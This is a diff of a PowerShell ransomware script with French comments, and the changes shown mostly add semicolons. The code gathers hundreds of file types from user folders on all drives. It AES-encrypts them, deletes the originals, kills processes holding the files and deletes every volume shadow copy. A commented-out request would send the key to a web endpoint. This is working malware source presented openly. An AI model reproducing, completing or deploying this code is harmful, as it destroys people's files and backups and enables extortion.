@@ -1,36 +1,36 @@
 function Get-Files($drive){
-    $files = gci "$($drive.Name)\Users\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
+    $files = gci "$($drive.Name)\Users\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv;
     return $files
 }
 
 function Create-AesManagedObject ($key, $IV) {
-    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize = 256
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged";
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
+    $aesManaged.BlockSize = 128;
+    $aesManaged.KeySize = 256;
     if ($IV) {
         if ($IV.getType().Name -eq "String") {
-            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV);
         }
         else {
-            $aesManaged.IV = $IV
+            $aesManaged.IV = $IV;
         }
     }
     if ($key) {
         if ($key.getType().Name -eq "String") {
-            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+            $aesManaged.Key = [System.Convert]::FromBase64String($key);
         }
         else {
-            $aesManaged.Key = $key
+            $aesManaged.Key = $key;
         }
     }
     $aesManaged
 }
 
 function Create-AesKey(){
-    $aesManaged = Create-AesManagedObject
-    $aesManaged.GenerateKey()
+    $aesManaged = Create-AesManagedObject;
+    $aesManaged.GenerateKey();
     [System.Convert]::ToBase64String($aesManaged.Key)
 }
 
@@ -42,9 +42,9 @@ function Encrypt-String ($key, $file, $aesManaged, $encryptor){
 }
 
 function Decrypt-String($key, $encryptedStringWithIV) {
-    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV);
+    $IV = $bytes[0..15];
+    $aesManaged = Create-AesManagedObject $key $IV;
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     <#$aesManaged.Dispose()#>
@@ -52,21 +52,21 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 }
 
 function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
-    $erroractionPreference = "stop"
+    $erroractionPreference = "stop";
     try{
-        $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
-        Remove-Item –path $file -force
+        $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor;
+        Remove-Item –path $file -force;
         Set-Content -Path $file'.enc' -Value $encryptedcontent
     }
     catch{
         try{
-            $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
-            Remove-Item –path $file -force
-            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
-            Set-Content -Path $file'.enc' -Value $encryptedcontent
+            $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor;
+            Remove-Item –path $file -force;
+            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}};
+            Set-Content -Path $file'.enc' -Value $encryptedcontent;
             }
             catch{
-                Write-Host $_.ScriptStackTrace
+                Write-Host $_.ScriptStackTrace;
                 Write-Host $_
             }
     }
@@ -78,7 +78,7 @@ function Too-Big($file, $key){
     }
     catch{
         try{
-            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
+            Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}};
             Remove-Item –path $file -force
         }
         catch{}
@@ -86,7 +86,7 @@ function Too-Big($file, $key){
 }
 
 function Encrypt-All($key, $drive, $aesManaged, $encryptor){
-    $files = Get-Files $drive 
+    $files = Get-Files $drive;
     Foreach ($file in $files){
         $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
         If ($toobig){
@@ -105,18 +105,18 @@ function Encrypt-All($key, $drive, $aesManaged, $encryptor){
 }
 
 function Decrypt-All($key){
-    $files=gci "$($drive.Name)\Users" -Recurse -Include *.enc
+    $files=gci "$($drive.Name)\Users" -Recurse -Include *.enc;
     Foreach ($file in $files){
-         $content = Get-Content $file
-         $decryptedcontent = Decrypt-String $key $content
-         $file = $file -replace ".{4}$"
-         Set-Content -Path $file -Value $decryptedcontent
+         $content = Get-Content $file;
+         $decryptedcontent = Decrypt-String $key $content;
+         $file = $file -replace ".{4}$";
+         Set-Content -Path $file -Value $decryptedcontent;
          Remove-Item –path $file'.enc'
     }
 }
 
 function main{
-    $erroractionPreference="stop"
+    $erroractionPreference="stop";
    try{
         <# Remove all snapshots#>
         gwmi Win32_Shadowcopy|%{if($($_.ClientAccessible) -eq "True"){$_.Delete()}};
@@ -183,8 +183,8 @@ function main{
     $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
 
    <#Créée la clé AES#>
-    $key = Create-AesKey
-    Set-Content 'key.aes' -Value $key 
+    $key = Create-AesKey;
+    Set-Content 'key.aes' -Value $key;
     <#Envoie la clé AES à notre API Web#>
     <#try{
         $ok = Invoke-WebRequest -Uri http://192.168.1.28:8080/ -Method POST -Body $key -UseBasicParsing
@@ -192,8 +192,8 @@ function main{
     catch{}#>
 
     <#Initialisation de l'AES#>
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
+    $aesManaged = Create-AesManagedObject $key;
+    $encryptor = $aesManaged.CreateEncryptor();
     <#Si plusieurs disques, faire un thread par disque #>
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
